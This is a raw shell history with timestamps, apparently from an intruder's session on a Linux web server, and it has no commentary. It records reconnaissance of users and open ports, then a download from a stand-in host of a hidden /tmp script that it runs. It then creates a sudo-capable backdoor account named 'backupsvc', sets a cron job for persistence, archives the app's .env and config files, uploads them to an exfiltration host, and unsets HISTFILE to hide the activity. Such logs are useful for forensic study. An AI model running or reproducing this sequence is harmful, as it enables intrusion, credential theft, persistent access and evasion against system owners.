#1789352140
id
#1789352144
uname -a
#1789352152
cat /etc/passwd
#1789352190
ss -tlnp
#1789352282
wget http://cdn-update.example/x.sh -O /tmp/.x.sh
#1789352289
chmod +x /tmp/.x.sh
#1789352292
/tmp/.x.sh
#1789352458
useradd -m -s /bin/bash backupsvc
#1789352484
usermod -aG sudo backupsvc
#1789352499
passwd backupsvc
#1789352702
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.x.sh") | crontab -
#1789353077
tar czf /tmp/.d.tgz /var/www/app/.env /var/www/app/config
#1789353220
curl -k -T /tmp/.d.tgz https://files.exfil-drop.example/upload
#1789353245
rm -f /tmp/.d.tgz
#1789353260
unset HISTFILE
